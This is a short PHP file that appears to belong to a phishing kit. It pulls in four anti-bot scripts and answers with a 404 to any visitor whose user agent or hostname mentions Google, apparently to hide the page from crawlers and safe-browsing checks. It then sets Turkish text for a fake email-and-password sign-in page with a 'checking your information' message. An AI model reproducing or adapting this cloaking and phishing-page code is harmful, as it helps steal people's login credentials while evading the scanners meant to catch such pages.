<?php
include "../bots/antibots1.php";
include "../bots/antibots2.php";
include "../bots/antibots3.php";
include "../bots/antibots4.php";

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

// connexion
$ERROR="Girdiğiniz bazı bilgiler hatalı.";
$Email= "E-posta";
$Password = "Şifre";
$dok = "Giriş Yapın";
$req1 = "Zorunlu";
$req2 = 'Şifre gerekli';
$forgot ="Giriş yapmakta sorun mu yaşıyorsunuz?";
$sign = "Hesap açın";
$checking = "Bilgileriniz kontrol ediliyor…";
$priva = "Gizlilik";
$ri8 = "Tüm hakları saklıdır";
$legal = "";
// fin connexioon
?>